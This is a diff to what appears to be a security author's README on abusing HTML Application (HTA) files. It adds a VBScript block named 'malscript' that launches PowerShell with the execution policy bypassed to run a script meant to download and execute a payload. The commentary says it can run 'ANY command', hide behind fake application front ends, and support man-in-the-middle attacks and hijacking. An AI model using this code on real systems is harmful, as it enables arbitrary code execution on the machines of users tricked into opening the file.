@@ -59,6 +59,29 @@ script type="text/javascript" src=PIE.js<BR />
  You will get a security warning when you open the HTA, so its not totally fool proof but most people just click past them.<BR />
  <BR /><BR />
 
+ SIXTH:<BR />
+ <SCRIPT language="VBScript" type="text/vbscript"><BR />
+	set objShell = CreateObject("WScript.Shell")<BR />
+	strOut=""<BR />
+	sub malscript<BR />
+	cmdarg="%comspec% /c powershell.exe -ExecutionPolicy bypass -file c:\temp\downloadfileandruncmd.ps1 "<BR />
+	set objExCmd = objShell.Exec(cmdarg)<BR />
+	strOut=objExCmd.StdOut.ReadAll<BR />
+	Set regEx = New RegExp<BR />
+	regEx.Pattern = "[\f\n\r\v]+"<BR />
+	regEx.Global = True<BR />
+	regEx.Multiline = True<BR />
+	strOut = regEx.Replace(strOut, "<br>")<BR />
+	TraceOut.innerHTML= strOut<BR />
+	end sub<BR />
+	//--><BR />
+</SCRIPT><BR />
+ The VBScript that can run ANY command or script. I do mean ANY command. I've you've got python or powershell scripts you can just replace the executable and what ever script parameters needed. In this case it will execute a malicious PowerShell scriipt and bypass the execution policy.<BR />
+ <BR /><BR />
+
+## Yes that's not so hard and its easy to construct fake application front ends even pass them off to websites for Man In the Middle Attacks, code injection, additional hijacking etc.
+ This isn't rocket science here. Its literally taking legacy functionality that should have been removed a decade and exploiting it.<BR />
+ 
 ## Connect with me at
 
 <a href="https://twitter.com/HMInfoSecViking?ref_src=twsrc%5Etfw"><IMG SRC="https://github.com/bvoris/bvoris/blob/master/twitter.jpg" WIDTH=10% HEIGHT=10% ALIGN=LEFT></a>
